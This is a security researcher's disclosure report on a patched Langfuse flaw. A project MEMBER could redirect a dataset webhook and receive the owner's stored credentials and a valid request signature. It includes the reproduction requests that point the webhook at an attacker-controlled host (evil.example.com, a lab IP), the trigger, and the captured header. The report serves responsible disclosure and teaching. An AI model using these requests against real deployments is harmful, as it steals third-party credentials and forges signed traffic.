# A project MEMBER can redirect a dataset's remote-experiment webhook and take the stored credentials with it

**Langfuse** · `GHSA-pvwh-5gff-vx9m` · reported 2026-08-07 · fixed in `4.16.0`

| | |
|---|---|
| **Target** | Langfuse (`langfuse/langfuse`), self-hosted |
| **Affected** | `>= 4.0.0, < 4.16.0`. The 3.x line is not affected |
| **Fixed in** | `4.16.0`, released 2026-08-21 — [PR #16307](https://github.com/langfuse/langfuse/pull/16307), merge commit `58cc5006` |
| **Class** | `CWE-522: Insufficiently Protected Credentials` |
| **Severity** | CVSS 3.1 `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N` → **8.5 High** |
| **Identifier** | Advisory draft `GHSA-pvwh-5gff-vx9m`, unpublished. No CVE assigned; CNA-LR request pending — see [Outcome](#outcome) |
| **Reported by** | Adel Zaitri |

---

## Summary

Langfuse datasets can be wired to a *remote experiment*: an outbound webhook that
Langfuse calls with the dataset's contents, authenticated with custom request
headers an administrator configures once and which are then stored encrypted.

The tRPC mutation that updates that configuration, `datasets.upsertRemoteExperiment`,
lets a caller change the destination URL while **omitting** `requestHeaders`. When
headers are omitted the handler deliberately preserves the stored encrypted
headers, and it leaves the webhook signing secret untouched by not writing to its
columns at all. Both behaviours are correct on an ordinary edit — you should not have
to retype a secret to rename a payload.

Neither preservation was conditioned on the URL staying the same.

So a project **MEMBER** — not an owner, not an admin — could repoint the webhook at
a host they control, trigger a delivery, and receive the administrator's secret
headers along with a valid Langfuse request signature over the delivered body.

Langfuse already treated this exact pattern as a vulnerability elsewhere in the
product, and had shipped the guard for it twice. The dataset router was missed both
times.

### The mechanism, in one picture

Two requests that differ in exactly one field. The first is the feature working as designed;
the second is the finding. Nothing in between compares the new URL against the stored one.

```mermaid
sequenceDiagram
    autonumber
    actor Owner as OWNER
    actor Member as MEMBER
    participant LF as upsertRemoteExperiment
    participant DB as encrypted columns
    participant Evil as MEMBER-controlled host

    Owner->>LF: configure remote experiment<br/>url = legit.example.com<br/>header = "Bearer SECRET"
    LF->>DB: store url, encrypted header, signing secret

    Note over Member,DB: CONTROL 1 — preservation is intended
    Member->>LF: update, SAME url, requestHeaders OMITTED
    LF->>DB: read stored headers, preserve
    LF-->>Member: 200 OK — correct, a secret should not need retyping

    Note over Member,Evil: THE FINDING — one field changes
    Member->>LF: update, url = evil.example.com, requestHeaders OMITTED
    Note right of LF: input.url is NEVER compared with<br/>dataset.remoteExperimentUrl
    LF->>DB: read stored headers, preserve anyway
    LF-->>Member: 200 OK
    Member->>LF: triggerRemoteExperiment — same datasets:CUD scope
    LF->>Evil: POST /collect<br/>authorization: Bearer SECRET<br/>x-langfuse-signature: t=...,v1=...
    Note over Evil: OWNER's credential + a valid<br/>Langfuse signature, delivered
```

---

## The architecture that made it possible

This is the transferable half, and it is not "a route forgot a check."

The product has two places where a stored secret is paired with a
caller-supplied destination: LLM connections (`llmApiKey`) and dataset remote
experiments (`datasets`). Both support partial update. Both therefore need the same
invariant:

> A stored secret may be inherited across an update **only if** the destination it
> was provisioned for has not changed.

That invariant is not expressible in either router's authorization layer, because
authorization here answers *"may this caller edit datasets?"* — and the answer is
legitimately yes. The invariant is about the *relationship between two fields in one
request*, one of which is absent. It lives in handler logic, which means it has to be
remembered once per handler, by hand, forever.

`llmApiKey` remembered. `datasets` did not.

The general shape worth taking away: **when a secret's safety depends on a field the
client may omit, the omission is the attack surface.** Masked-value preservation is
a UX affordance that quietly becomes a security control the moment any other field
in the same payload can redirect where that secret goes. Anywhere a product
implements "leave blank to keep existing," there is a question to ask — keep it
*for what*?

That question generalises past Langfuse. The pattern appears in SMTP relay configs,
outbound webhook registrations, mirror/replication targets, OAuth client
registrations, and every "test this connection" button that reuses a stored key.

---

## Impact

**The boundary crossed:** a lower-privileged project role obtains credentials
provisioned by a higher-privileged one, and gains a signed-request oracle.

Delivered to the attacker-controlled host in the reproduction:

- **The stored custom request header, verbatim** — `authorization: Bearer
  CVEHUNT-1-0BA2D314-A` in the lab. In a real deployment this is whatever bearer
  token or API key an administrator configured for the legitimate experiment
  endpoint.

- **A valid `x-langfuse-signature`** over the delivered body (`t=<ts>,v1=<hmac>`),
  produced with the dataset's webhook signing secret. Any receiver validating
  Langfuse signatures accepts it.

The signing secret is the sharper half, and it is the half with no counterpart in the
sibling finding discussed below. A leaked bearer token is a credential to one
third-party service. A valid signature means the attacker can produce traffic that a
downstream consumer authenticates *as Langfuse*, over a body the attacker partly
controls. That is a signing oracle, and its blast radius sits outside Langfuse
entirely — which is why the CVSS vector claims scope change.

### Prerequisites, stated plainly

- An account with the project role **MEMBER** or higher. From
  `packages/shared/src/features/rbac/projectAccessRights.ts`, the `datasets:CUD`
  scope appears in the OWNER (`:109`), ADMIN (`:166`) and MEMBER (`:218`) lists, and
  not in VIEWER or NONE. MEMBER is the lowest role that can do this.

- An existing remote-experiment configuration on a dataset, created by someone with
  credentials worth stealing.

- A destination host that passes Langfuse's own webhook URL validation —
  `validateWebhookURL(input.url)` is applied. **This is not an SSRF report** and
  there is no claim of internal-host reachability.

No additional privilege is needed at any step. Both the repoint and the trigger run
under the same `datasets:CUD` scope.

### On the severity

`8.5 High`, vector `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`.

The scope change is the one component worth defending, so: the leaked material is a
credential for a *third-party* service plus a valid signature minted by the
vulnerable system, and both are consumed by systems outside Langfuse's security
authority. The signature in particular cannot be reasoned about inside the product's
own boundary — its value to an attacker is entirely a function of what downstream
consumers trust.

`C:H` is a bearer token and a signing key, both verbatim. `I:L` is the conservative
call already: the attacker rewrites the remote-experiment configuration and obtains
Langfuse-signed requests over partly attacker-controlled bodies.

---

## Reproduction

`evidence/repro.sh` runs the whole thing end to end — two fresh signups, both
controls, the attack, and three reproductions — against a stock `docker compose`
deployment:

```bash
BASE=http://localhost:20502 NETWORK=rl-langfuse_default ./repro.sh
```

It stands up its own receiving collector as a container on the Langfuse network, so
nothing outside the deployment is contacted. It creates uniquely-named users per run
and is safe to re-run. `BASE` must use `localhost` rather than `127.0.0.1`, because
next-auth checks the `Host` header against `NEXTAUTH_URL`.

Full HTTP exchanges are in `evidence/control.http.txt` and
`evidence/attack.http.txt`, the receiving collector's log in
`evidence/collector.log`, and the determinism log in `evidence/repeat.log`. Session
cookies in the attachments are redacted; they were lab-only.

**Setup.** One project. Principal A as OWNER, principal B as MEMBER. A configures a
dataset remote experiment pointing at a legitimate URL, with a custom header
`Authorization: Bearer CVEHUNT-1-0BA2D314-A` and signing enabled.

### Control 1 — preservation is intended behaviour

B updates the configuration **without** changing the URL, omitting `requestHeaders`.
Stored secrets are preserved. This is correct, and it is the feature working as
designed:

```http
POST /api/trpc/datasets.upsertRemoteExperiment
{"json":{"projectId":"…","datasetId":"…","url":"https://example.com/run",
         "defaultPayload":"{}","enabled":true}}

HTTP/1.1 200 OK
```

Establishing this first matters. Without it, the finding is indistinguishable from a
complaint about masked-value preservation in general — which is a feature, not a
bug.

### Control 2 — the product's own standard for this pattern

The same operation against the guarded sibling router: change a stored credential's
destination without supplying a new secret.

```http
POST /api/trpc/llmApiKey.update
{"json":{"…","baseURL":"http://172.19.0.8/v1"}}

{"error":{"json":{"message":"Secret key is required when changing the base URL",
  "code":-32600,"data":{"code":"BAD_REQUEST","httpStatus":400}}}}
```

Refused. This is the spine of the whole report: it is not my opinion about what the
correct behaviour is, it is Langfuse's, enforced in their own code, on the same
operation, one router over.

### The finding

**Step 1 — B repoints the URL, `requestHeaders` omitted.** Byte-for-byte identical
to Control 1 except the `url` value:

```http
POST /api/trpc/datasets.upsertRemoteExperiment
{"json":{"projectId":"…","datasetId":"…","url":"http://172.19.0.8/collect",
         "defaultPayload":"{}","enabled":true}}

HTTP/1.1 200 OK
```

**Step 2 — B fires the delivery, same scope:**

```http
POST /api/trpc/datasets.triggerRemoteExperiment
{"json":{"projectId":"…","datasetId":"…"}}

{"result":{"data":{"json":{"success":true}}}}
```

**What arrived at B's host:**

```http
POST /collect HTTP/1.1
host: 172.19.0.8
authorization: Bearer CVEHUNT-1-0BA2D314-A
user-agent: Langfuse/1.0
x-langfuse-signature: t=1786023040,v1=7118620cb011cb114d5cbf9fee88eecd70edfcb9a243d07b50c8abe7813e6732

{"projectId":"…","datasetId":"…","datasetName":"lead1-ds","payload":"{}"}
```

The `Authorization` value carries principal A's marker, so there is no ambiguity
about whose credential this is. "A request arrived" would not have been evidence of
anything; *A's marker arriving at B's host* is the finding.

### Determinism

Three consecutive runs. Each iteration resets the URL to the legitimate destination
as A, then repoints and triggers as B:

```
run 1  marker-hits 1->2  headers_md5=b05314eb21e1597135e16809f44357e3  PASS
run 2  marker-hits 2->3  headers_md5=b05314eb21e1597135e16809f44357e3  PASS
run 3  marker-hits 3->4  headers_md5=b05314eb21e1597135e16809f44357e3  PASS
```

The header hash is identical to the baseline recorded before B acted — so the
delivered credential is byte-for-byte the stored one, not a re-derived or
re-encrypted value.

---

## Root cause

`web/src/features/datasets/server/dataset-router.ts:2135`, `upsertRemoteExperiment`.

The handler authorizes on scope, then preserves both secrets unconditionally:

```js
throwIfNoProjectAccess({ session: ctx.session, projectId: input.projectId,
                         scope: "datasets:CUD" });

// Read encrypted custom headers to preserve masked values on update.
// The signing secret itself is preserved by leaving its columns untouched.
const dataset = await getRemoteExperimentConfig({ … });

await validateWebhookURL(input.url);

const { requestHeaders, displayHeaders } = processRemoteExperimentHeaders(
  input.requestHeaders,
  parseStoredRemoteExperimentHeaders(dataset.remoteExperimentRequestHeaders),
);
```

Across the whole handler, `input.url` is referenced exactly three times: in the input
schema, in `validateWebhookURL(input.url)`, and in the write `remoteExperimentUrl:
input.url`. **It is never compared against the stored `remoteExperimentUrl`.**

The comment at `:2154-2155` states the preservation intent plainly and does not
contemplate the destination changing underneath it. That comment is the tell. It
describes a UX intent — keep masked values — written by someone reasoning about
edits, not about redirection.

### The same class, already fixed twice, in a sibling router

`web/src/features/llm-api-key/server/router.ts` guards precisely this:

```js
// :543, inside `testUpdate` (procedure begins :513)
const isBaseURLChanged = baseURL !== existingKey.baseURL;
if (isBaseURLChanged && !hasNewSecretKey) {
  throw new TRPCError({ code: "BAD_REQUEST",
    message: "Secret key is required when changing the base URL" });
}

// :636, the same check inside `update` (procedure begins :593)
if (isBaseURLChanged && !input.secretKey) { … }
```

Both mutations that can move a stored LLM credential's destination carry the check.
The dataset equivalent carried neither. And the guard had shipped twice:

- `7527bb0d8` (2026-04-09) — *fix(web): require secret key for LLM test base URL changes* (#13055)
- `eae96042f` (2026-07-24) — *fix(llm): require fresh secrets for base URL changes* (#15401)

The second broadened the first, which is a clear signal the class was understood and
considered worth fixing. The dataset remote-experiment path carried the same shape —
a stored secret, a caller-supplied destination, preservation on partial update — and
was covered by neither change.

### The sibling instance has a CVE

`7527bb0d8` / #13055 is the patch behind **CVE-2026-41487**
([GHSA-2524-j966-gfgh](https://github.com/advisories/GHSA-2524-j966-gfgh)), published
2026-04-17: *"Improper Role-Based Access Control in Langfuse LLM Connection
Management."* Its description is this finding with one noun changed — a project
member requests the update of an existing LLM connection to an attacker-controlled
`baseUrl`, Langfuse reuses the stored provider secret, and the test request goes to
the attacker's endpoint. Affected `>= 3.68.0, < 3.167.0`.

Same actor, same mechanism, same outcome, one router over. Plus, here, the signature
oracle, which 41487 does not have.

**And the version ranges do not overlap.** CVE-2026-41487 records fixed-in
`3.167.0`. Anyone running 4.x who matches their deployment against that record
concludes they are patched. They were not: `dataset-router.ts` was byte-identical
from `4.0.0` through `4.15.0`. There is currently no public record a scanner or SBOM
consumer can match for the 4.x window — which is a defect in the public record
rather than an opinion about severity.

---

## The fix, as shipped

[PR #16307](https://github.com/langfuse/langfuse/pull/16307), *"fix(datasets): bind
secret headers to remote URL"*, merged 2026-08-20, released in `4.16.0`. It touches
`dataset-router.ts` (+39/−3) and its servertest, and adds:

```js
const reusesSecretHeader = Object.entries(existingHeaders).some(
  ([key, existingHeader]) => {
    if (!existingHeader.secret) return false;
    // Omitting requestHeaders preserves every existing header.
    if (input.requestHeaders === undefined) return true;
    const normalizedKey = key.trim().toLowerCase();
    const submittedHeader = submittedHeadersByLowerKey?.[normalizedKey];
    // An empty submitted value preserves the existing secret.
    return submittedHeader?.value.trim() === "";
  },
);

if (input.url !== dataset.remoteExperimentUrl && reusesSecretHeader) {
  throw new TRPCError({
    code: "BAD_REQUEST",
    message: "Secret headers must be re-entered when changing the remote experiment URL",
  });
}
```

This is tighter than what I suggested. My proposed check keyed off
`!input.requestHeaders`, which would have refused a URL change whenever headers were
omitted — including when no stored header was secret, and including when the caller
submitted a complete fresh set under a different key casing. The shipped version asks
the precise question: *does this update reuse an existing secret header, by omission
or by empty value, while moving the URL?* Header keys are normalised to lowercase
before comparison, which closes a bypass my version would have left open.

**Does it cover the class?** For the request headers, yes — and the maintainer's own
PR description is a better summary of the root cause than my report's was:

> Remote experiment headers use empty or omitted values to preserve encrypted
> credentials during ordinary edits. The update mutation applied that preservation
> even when the remote URL changed, which could send an existing credential to a
> different destination.

Two residuals I would still look at, and the first is the one I care about:

1. **The signing secret is not addressed by this fix.** The guard keys on
   `reusesSecretHeader` — the custom headers. A configuration with signing enabled and
   *no* secret custom header can still have its URL moved, and the new destination
   still receives `x-langfuse-signature` minted with the pre-existing signing secret.
   The oracle half of the impact survives in that configuration. On a destination
   change the signing secret should arguably be rotated rather than carried across,
   so the old destination cannot be impersonated to the new one and the new one
   cannot receive signatures minted for the old.

2. **The scope question is untouched.** `datasets:CUD` is a broad content-management
   scope, and the ability to redirect an outbound authenticated webhook sits oddly
   inside it. That is a design question rather than a bug, and reasonable people land
   differently on it, but it is the control that would have made both instances of
   this class unreachable from MEMBER.

The variant-hunting lesson generalises: **the fix is where you look for the next
finding.** A guard that enumerates which secrets it protects tells you which secrets
it does not.

---

## Outcome

| Date | Event |
|---|---|
| 2026-08-07 | Reported privately via GitHub security advisory, `GHSA-pvwh-5gff-vx9m` |
| 2026-08-20 | Maintainer merges [#16307](https://github.com/langfuse/langfuse/pull/16307) |
| 2026-08-21 | Fix released in `4.16.0` |
| 2026-09-23 | Advisory draft closed **without publication**. CVE declined: *"We considered this fix as additional hardening and not requiring a CVE."* |
| 2026-10-02 | `https://github.com/advisories/GHSA-pvwh-5gff-vx9m` still returns 404. No public artifact exists |
| 2026-10-02 | CVE ID requested from the CVE Program's CNA of Last Resort. Request filed; awaiting assignment |

The finding was confirmed, fixed, and shipped. It has no identifier and no published
advisory, which means operators who had a dataset remote experiment configured with
custom auth headers have not been told to rotate that credential or the webhook
signing secret.

I think the hardening classification is wrong, and the argument is not about
severity. It is that the same class in the sibling router was assigned CVE-2026-41487
and published, with an affected range that stops at `3.167.0` — so the public record
now contains a version range that tells 4.x operators they are patched against a
pattern they were exposed to until `4.16.0`. A CVE request to the CVE Program's CNA
of Last Resort was filed on 2026-10-02 on that basis and is pending. If it is
declined too, that outcome gets added to this table rather than removed from it.

**That disagreement is recorded here rather than argued further with the
maintainer.** He fixed it quickly, he fixed it better than I proposed, and his PR
description is a more honest statement of the impact than many published advisories
manage. Classification and remediation are different things, and he got the one that
matters right.

---

## How I found it

Not by scanning, and not by a tool.

I was reading Langfuse for a different bug class — multi-user authorization in
retrieval paths — and `llmApiKey`'s base-URL guard came up as a *negative* result:
a place where the check I expected to be missing was present. Twice over, in two
commits, which is the sort of thing that reads as a lesson learned rather than a
coincidence.

That reframed the question from *"is this guarded?"* to *"where else does this
product pair a stored secret with a caller-supplied destination, and did the lesson
reach there?"* Grepping for the pattern of the guard rather than the pattern of the
bug produced one unguarded sibling. Reading the two handlers side by side took about
twenty minutes; the comment at `dataset-router.ts:2154` made it obvious.

Two leads died on the way, both worth more than the one that lived:

- I first chased the remote-experiment path as an **SSRF**, on the assumption that
  `validateWebhookURL` would be bypassable. It is not, at least not in any way I
  could demonstrate, and the finding is better for not claiming it. The destination
  must pass Langfuse's own validation; this report does not depend on reaching
  internal hosts.
- I expected the **signing secret** to be derived per-destination, which would have
  made the oracle half go away. It is not — it is stored per-dataset and preserved by
  omission of a write. That negative is what turned a credential leak into a signing
  oracle, and it is the half the shipped fix still does not address.

**What the tooling did and did not do.** The harness produced the evidence: the
marked credential, the control run against the guarded sibling, the receiving
collector on the Langfuse network, and the three deterministic reproductions. It did
not discover the finding. Reading two routers next to each other did. Marker-based
evidence is what makes the result unarguable — `CVEHUNT-1-0BA2D314-A` arriving at B's
host is not open to interpretation the way "a request was received" would be — but
unarguable evidence of the wrong thing is still the wrong thing.

---

## Credit and ethics

Thanks to [@hassiebp](https://github.com/hassiebp) for a fast fix and a clear PR
description, and for a guard that is better than the one I proposed.

All testing was performed against a local self-hosted instance with synthetic data.
No hosted service and no third-party deployment was touched. The credential
delivered in the reproduction is a lab marker string, not a real token. Published
after the fix was released.

---

## Evidence bundle

| File | What it is |
|---|---|
| `evidence/repro.sh` | End-to-end reproduction: signups, both controls, attack, 3× repeat |
| `evidence/control.http.txt` | Control 1 (preservation is intended) and Control 2 (guarded sibling refuses) |
| `evidence/attack.http.txt` | The repoint, the trigger, and what arrived at the collector |
| `evidence/collector.log` | Receiving host's log, with A's marker in the `authorization` header |
| `evidence/repeat.log` | Three deterministic reproductions with matching header hashes |
| `evidence/versions.txt` | Pinned tag, commit, and image digests for the tested deployment |
| `evidence/markers.txt` | The per-principal markers, and why marker-crossing is the finding |

## References

- [langfuse/langfuse#16307](https://github.com/langfuse/langfuse/pull/16307) — the fix
- [CVE-2026-41487 / GHSA-2524-j966-gfgh](https://github.com/advisories/GHSA-2524-j966-gfgh) — the same class in the sibling router, vendor-assigned
- `7527bb0d8` (#13055), `eae96042f` (#15401) — the sibling guard, shipped twice
- [CWE-522: Insufficiently Protected Credentials](https://cwe.mitre.org/data/definitions/522.html)
- [CVE Program: reporting as a non-CNA](https://www.cve.org/ReportRequest/ReportRequestForNonCNAs)
